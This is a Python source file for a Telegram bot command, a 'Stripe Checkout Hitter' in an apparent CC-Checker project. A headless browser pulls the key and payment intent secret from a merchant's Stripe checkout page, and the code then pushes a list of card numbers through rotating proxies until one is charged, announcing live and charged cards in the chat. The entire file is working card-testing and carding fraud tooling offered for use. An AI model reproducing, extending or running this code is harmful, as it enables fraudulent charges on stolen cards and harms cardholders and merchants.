"""
handlers/hitter_handler.py — Stripe Checkout Hitter (Playwright-powered)

Commands:
  /stripehitter <checkout_url>          → Auto-analyze URL (headless browser) + wait for cards
  /stripehitter <checkout_url> + .txt   → Analyze + Hit immediately
  /stripehitter <pk_live_> <pi_secret_> → Manual keys (reply to .txt)
  /stripehitter (reply to .txt)         → Use stored session

Flow:
  1. Playwright headless browser opens the Stripe checkout URL
  2. Intercepts XHR responses to capture pk_live + pi_secret automatically
  3. For each card: create PaymentMethod → confirm PI → parse result
  4. STOP IMMEDIATELY on first CHARGED result
"""
import asyncio
import re
import time
import logging
import aiohttp
from aiohttp import ClientTimeout
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from core.parser import parse_cc
from gateways.stripe_gate import (
    _create_pm, _confirm_pi_with_pm, _parse_result,
    STRIPE_JS_HEADERS,
)
from gateways.base import GatewayResult, CCStatus
from core.proxy_manager import get_next_proxy, _build_proxy_url
import config

logger = logging.getLogger("CC-Checker.StripeHitter")

STRIPE_TIMEOUT = ClientTimeout(total=15)

# Per-user stored session (chat_id → session_info dict)
_hitter_sessions: dict[int, dict] = {}

# Stop signal per chat
_hitter_stop: dict[int, bool] = {}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _extract_session_id(url: str) -> str | None:
    m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+)', url)
    return m.group(1) if m else None


def _get_proxy() -> tuple[dict, str]:
    proxy = get_next_proxy()
    if proxy:
        url = _build_proxy_url(proxy)
        disp = f"{proxy['host']}:{proxy['port']}"
        return {"proxy": url}, disp
    return {}, "Direct"


async def analyze_stripe_checkout(url: str) -> dict:
    """
    Use Playwright headless browser to intercept Stripe network traffic
    and automatically extract pk_live + client_secret.
    """
    from core.stripe_extractor import extract_stripe_checkout
    proxy = get_next_proxy()
    proxy_url = _build_proxy_url(proxy) if proxy else None
    logger.info(f"Playwright extractor starting for: {url[:60]}...")
    return await extract_stripe_checkout(url, timeout_ms=25000, proxy=proxy_url)


async def hit_card(session_info: dict, card, proxy_kwargs: dict) -> GatewayResult:
    """Try a single card on the stored Stripe payment intent."""
    pk          = session_info["pk"]
    secret      = session_info["secret"]
    intent_id   = session_info["intent_id"]
    intent_type = session_info.get("intent_type", "payment")

    try:
        async with aiohttp.ClientSession(timeout=STRIPE_TIMEOUT) as s:
            # Step 1: Create PaymentMethod
            pm_resp = await _create_pm(s, card, pk)
            pm_id   = pm_resp.get("id", "")

            if not pm_id or "error" in pm_resp:
                return _parse_result(pm_resp, "StripeHitter")

            # Step 2: Confirm Intent
            if intent_type == "setup":
                headers = {**STRIPE_JS_HEADERS, "Authorization": f"Bearer {pk}"}
                data = {
                    "client_secret": secret,
                    "payment_method": pm_id,
                    "return_url": "https://example.com/return",
                }
                async with s.post(
                    f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm",
                    data=data, headers=headers, ssl=False, **proxy_kwargs
                ) as r:
                    c_resp = await r.json(content_type=None)
            else:
                c_resp = await _confirm_pi_with_pm(s, intent_id, secret, pm_id, pk)

            return _parse_result(c_resp, "StripeHitter")

    except asyncio.TimeoutError:
        return GatewayResult(status=CCStatus.ERROR, gateway="StripeHitter",
                             message="Timeout", raw_code="timeout")
    except Exception as e:
        return GatewayResult(status=CCStatus.ERROR, gateway="StripeHitter",
                             message=str(e)[:60], raw_code="net_error")


def _fmt_line(card, result: GatewayResult, elapsed: float) -> str:
    cc = f"{card.number}|{card.month}|{card.year}|{card.cvv}"
    if result.status == CCStatus.CHARGED:
        return f"✅ **CHARGED** — `{cc}`\n   💬 {result.message} | ⏱ {elapsed:.1f}s"
    elif result.status == CCStatus.LIVE_VBV:
        return f"🔐 **3DS/VBV** — `{cc}`\n   💬 {result.message} | ⏱ {elapsed:.1f}s"
    elif result.status == CCStatus.INSUFFICIENT:
        return f"⚠️ **NSF LIVE** — `{cc}`\n   💬 {result.message} | ⏱ {elapsed:.1f}s"
    elif result.status == CCStatus.DO_NOT_HONOR:
        return f"🔥 **LIVE/DNH** — `{cc}`\n   💬 {result.message} | ⏱ {elapsed:.1f}s"
    elif result.status == CCStatus.ERROR:
        return f"🔄 **ERROR** — `{cc}` | {result.message}"
    else:
        return f"❌ **DEAD** — `{cc}` | {result.message}"


# ── Main Handler ──────────────────────────────────────────────────────────────

def register_hitter_handler(app: Client):

    @app.on_message(filters.command(["stripehitter", "shitter"]))
    async def stripe_hitter_cmd(client: Client, msg: Message):
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("🚫 Owner only.")
            return

        text    = msg.text.strip()
        parts   = text.split()
        chat_id = msg.chat.id

        # Detect attached .txt file
        doc_msg = None
        if msg.document and (msg.document.file_name or "").lower().endswith(".txt"):
            doc_msg = msg
        elif msg.reply_to_message and msg.reply_to_message.document:
            rp = msg.reply_to_message
            if (rp.document.file_name or "").lower().endswith(".txt"):
                doc_msg = rp

        # Parse args
        checkout_url  = None
        manual_pk     = None
        manual_secret = None

        if len(parts) >= 3 and parts[1].startswith("pk_"):
            manual_pk     = parts[1]
            manual_secret = parts[2]
        elif len(parts) >= 2 and "stripe.com" in parts[1]:
            checkout_url = parts[1]
        elif len(parts) == 1 and doc_msg and chat_id in _hitter_sessions:
            pass  # Use stored session
        else:
            stored = _hitter_sessions.get(chat_id)
            stored_txt = ""
            if stored:
                stored_txt = (
                    f"\n\n📌 **Active Session:**\n"
                    f"`{stored['pk'][:22]}...` | `{stored['intent_id'][:20]}...`\n"
                    f"💰 `${stored.get('amount', 0):.2f} {stored.get('currency', 'USD')}`"
                )
            await msg.reply(
                "🎯 **Stripe Checkout Hitter** *(Playwright-powered)*\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "**Methods:**\n"
                "`/stripehitter <checkout.stripe.com/...>`\n"
                "→ Auto-extracts keys via headless browser\n\n"
                "`/stripehitter <pk_live_...> <pi_xxx_secret_xxx>`\n"
                "→ Manual keys (reply to .txt)\n\n"
                "**With file:** Send `.txt` with caption `/stripehitter <url>`" + stored_txt,
                parse_mode=enums.ParseMode.MARKDOWN
            )
            return

        # Resolve session info
        session_info = None

        if manual_pk and manual_secret:
            intent_id   = manual_secret.split("_secret_")[0]
            intent_type = "setup" if manual_secret.startswith("seti_") else "payment"
            session_info = {
                "pk": manual_pk, "secret": manual_secret,
                "intent_id": intent_id, "intent_type": intent_type,
                "amount": 0, "currency": "USD",
                "merchant": "Manual Keys", "session_id": "manual", "url": "manual"
            }
            wait_msg = await msg.reply(
                f"✅ **Manual Keys Set**\n"
                f"🔑 `{manual_pk[:22]}...`\n"
                f"🔐 `{manual_secret[:28]}...`\n"
                f"📋 Type: `{intent_type.upper()} INTENT`",
                parse_mode=enums.ParseMode.MARKDOWN
            )

        elif checkout_url:
            wait_msg = await msg.reply(
                f"🔍 **Opening Stripe Checkout (headless browser)...**\n"
                f"`{checkout_url[:70]}`\n\n"
                f"⏳ Intercepting network traffic... (~15-25s)",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            session_info = await analyze_stripe_checkout(checkout_url)

            if "error" in session_info:
                # Even if error, check if we got a pk (partial result)
                partial_pk = session_info.get("pk", "")
                err_text = (
                    f"❌ **Extraction Failed**\n\n"
                    f"{session_info['error']}"
                )
                if partial_pk:
                    err_text += f"\n\n💡 **PK Found:** `{partial_pk[:25]}...`\nUse manual key input."
                await wait_msg.edit_text(err_text, parse_mode=enums.ParseMode.MARKDOWN)
                return

            _hitter_sessions[chat_id] = session_info

            if not doc_msg:
                pk_d  = session_info['pk'][:25] + "..."
                sec_d = session_info['secret'][:30] + "..."
                amt_d = f"${session_info['amount']:.2f} {session_info['currency']}" if session_info.get('amount') else "Unknown"
                await wait_msg.edit_text(
                    f"✅ **Checkout Analyzed!**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏪 **Merchant:** `{session_info.get('merchant', '?')}`\n"
                    f"💰 **Amount:** `{amt_d}`\n"
                    f"📋 **Type:** `{session_info['intent_type'].upper()} INTENT`\n"
                    f"🔑 **PK:** `{pk_d}`\n"
                    f"🔐 **Secret:** `{sec_d}`\n\n"
                    f"✅ **Session stored!**\n"
                    f"📤 Now send a `.txt` file and reply to it with `/stripehitter`",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
                return

        else:
            session_info = _hitter_sessions.get(chat_id)
            if not session_info:
                await msg.reply(
                    "❌ No active session.\n"
                    "First set a URL: `/stripehitter <checkout_url>`",
                    parse_mode=enums.ParseMode.MARKDOWN
                )
                return
            wait_msg = await msg.reply("⏳ Using stored session...")

        # Download cards file
        if not doc_msg:
            await wait_msg.edit_text("❌ No `.txt` cards file provided.")
            return

        try:
            file_data = await client.download_media(doc_msg.document, in_memory=True)
            content   = file_data.getvalue().decode("utf-8", errors="ignore")
        except Exception as e:
            await wait_msg.edit_text(f"❌ File download failed: `{e}`")
            return

        cards = [c for c in (parse_cc(line) for line in content.splitlines() if line.strip()) if c]
        if not cards:
            await wait_msg.edit_text("❌ No valid cards found.\nFormat: `4111111111111111|12|2026|123`")
            return

        total      = len(cards)
        _hitter_stop[chat_id] = False

        stop_btn = InlineKeyboardMarkup([[
            InlineKeyboardButton("🛑 STOP HITTER", callback_data=f"stop_hitter_{chat_id}")
        ]])

        amt_s = f"${session_info.get('amount', 0):.2f} {session_info.get('currency', 'USD')}" \
                if session_info.get('amount') else "?"

        await wait_msg.edit_text(
            f"🎯 **Stripe Hitter Started!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏪 **Merchant:** `{session_info.get('merchant', 'Unknown')}`\n"
            f"💰 **Amount:** `{amt_s}`\n"
            f"📋 **Cards:** `{total}`\n"
            f"🔑 **PK:** `{session_info['pk'][:22]}...`\n"
            f"⚡ **Mode:** Sequential (1.2s delay)\n\n"
            f"⏳ Hitting...",
            parse_mode=enums.ParseMode.MARKDOWN,
            reply_markup=stop_btn
        )

        checked = live_count = dead_count = error_count = 0
        charged_card = None
        last_update  = time.monotonic()

        for i, card in enumerate(cards):
            if _hitter_stop.get(chat_id, False):
                break

            proxy_kwargs, proxy_disp = _get_proxy()

            if i > 0:
                await asyncio.sleep(1.2)

            t0      = time.monotonic()
            result  = await hit_card(session_info, card, proxy_kwargs)
            elapsed = time.monotonic() - t0
            checked += 1
            cc      = f"{card.number}|{card.month}|{card.year}|{card.cvv}"

            # ── CHARGED → stop immediately ─────────────────────────────────
            if result.status == CCStatus.CHARGED:
                live_count  += 1
                charged_card = card
                try:
                    alert = await client.send_message(
                        chat_id=chat_id,
                        text=(
                            f"🔥🔥🔥 **CHARGED!** 🔥🔥🔥\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💳 `{cc}`\n"
                            f"💰 **Amount:** `{amt_s}`\n"
                            f"🏪 **Merchant:** `{session_info.get('merchant', '?')}`\n"
                            f"💬 **Response:** `{result.message}`\n"
                            f"⏱ **Time:** `{elapsed:.2f}s`\n"
                            f"📋 **Cards Tried:** `{checked}`\n\n"
                            f"🛑 **Hitter stopped — link consumed!**"
                        ),
                        parse_mode=enums.ParseMode.MARKDOWN
                    )
                    await client.pin_chat_message(chat_id=chat_id, message_id=alert.id, disable_notification=False)
                except Exception:
                    pass
                break

            # ── Live/VBV/NSF → instant alert ──────────────────────────────
            elif result.status in (CCStatus.LIVE_VBV, CCStatus.INSUFFICIENT, CCStatus.DO_NOT_HONOR):
                live_count += 1
                try:
                    await client.send_message(
                        chat_id=chat_id,
                        text=_fmt_line(card, result, elapsed),
                        parse_mode=enums.ParseMode.MARKDOWN
                    )
                except Exception:
                    pass
            elif result.status == CCStatus.ERROR:
                error_count += 1
            else:
                dead_count += 1

            # ── Progress update every 5 cards or 3 seconds ────────────────
            now = time.monotonic()
            if checked % 5 == 0 or (now - last_update) >= 3.0 or checked == total:
                last_update = now
                prog = (
                    f"🎯 **Stripe Hitter Running**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📦 **Progress:** `{checked}/{total}`\n"
                    f"✅ **Live/VBV:** `{live_count}`\n"
                    f"❌ **Dead:** `{dead_count}`\n"
                    f"🔄 **Errors:** `{error_count}`\n"
                    f"🌐 **Proxy:** `{proxy_disp}`\n\n"
                    f"⏳ Last: {_fmt_line(card, result, elapsed)}"
                )
                try:
                    markup = stop_btn if not _hitter_stop.get(chat_id) else None
                    await wait_msg.edit_text(prog, parse_mode=enums.ParseMode.MARKDOWN, reply_markup=markup)
                except Exception:
                    pass

        # Final summary
        stop_reason = (
            "🔥 CHARGED — link consumed!" if charged_card else
            "🛑 Manually stopped" if _hitter_stop.get(chat_id) else
            "✅ All cards checked"
        )
        try:
            await wait_msg.edit_text(
                f"🏁 **Hitter Complete**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 **Checked:** `{checked}/{total}`\n"
                f"✅ **Live/VBV:** `{live_count}`\n"
                f"❌ **Dead:** `{dead_count}`\n"
                f"🔄 **Errors:** `{error_count}`\n"
                f"📌 **Result:** {stop_reason}",
                parse_mode=enums.ParseMode.MARKDOWN,
                reply_markup=None
            )
        except Exception:
            pass

        _hitter_stop.pop(chat_id, None)

    # ── STOP button ───────────────────────────────────────────────────────────
    @app.on_callback_query(filters.create(
        lambda _, __, cb: cb.data and cb.data.startswith("stop_hitter_")
    ))
    async def stop_hitter_cb(client: Client, cb):
        try:
            chat_id = int(cb.data.split("stop_hitter_")[1])
        except Exception:
            await cb.answer("Invalid.")
            return
        if cb.from_user.id not in config.OWNER_IDS:
            await cb.answer("Owner only.", show_alert=True)
            return
        _hitter_stop[chat_id] = True
        await cb.answer("🛑 Stopping hitter...", show_alert=True)
